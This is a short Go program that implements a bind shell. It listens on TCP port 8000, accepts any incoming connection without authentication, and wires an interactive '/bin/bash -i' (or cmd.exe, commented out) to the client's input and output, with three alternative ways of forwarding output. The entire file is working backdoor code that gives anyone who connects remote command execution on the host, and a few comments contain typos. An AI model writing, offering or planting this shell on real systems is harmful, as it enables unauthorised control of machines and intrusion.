package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// a flusher that wraps a custom writer; this flusher handles writing and flushing all writes afterward
type Flusher struct {
	Writer *bufio.Writer
}

// create new flusher 9bject
func NewFlusher(writer io.Writer) *Flusher {
	return &Flusher{Writer: bufio.NewWriter(writer)}
}

func (self *Flusher) Write(bytes []byte) (int, error) {
	if count, err := self.Writer.Write(bytes); err == nil {
		if err = self.Writer.Flush(); err != nil {
			return -1, err
		}
		return count, nil
	} else {
		return -1, err
	}
}

func handleSimply(conn *net.Conn, cmd *exec.Cmd) {
	// may not work in windows; con ected client may not receive command outputs
	cmd.Stdout = *conn
}

func handleByFlusher(conn *net.Conn, cmd *exec.Cmd) {
	cmd.Stdout = NewFlusher(*conn)
}

func handleByPipes(conn *net.Conn, cmd *exec.Cmd) {
	readerPipe, writerPipe := io.Pipe() // 2 synchron8zed pipes
	cmd.Stdout = writerPipe             // output of the cmd goes to the writer pipe and after that,to the reader pipe

	go io.Copy(*conn, readerPipe)

}
func main() {
	if server, err := net.Listen("tcp", ":8000"); err == nil {
		for {

			if conn, err := server.Accept(); err == nil {
				defer conn.Close()
				cmd := exec.Command("/bin/bash", "-i") // open bash in interactive mode for linux
				// for windows:
				//cmd := exec.Command("cmd.exe")

				// redirect this cmd in and out to client
				cmd.Stdin = conn
				//handleSimply(&conn, cmd)
				//handleByFlusher(&conn, cmd)
				handleByPipes(&conn, cmd)
				// run
				if err = cmd.Run(); err != nil {
					log.Fatalln(err)
				}
			} else {
				log.Fatalln(err)
			}
		}
	}
}
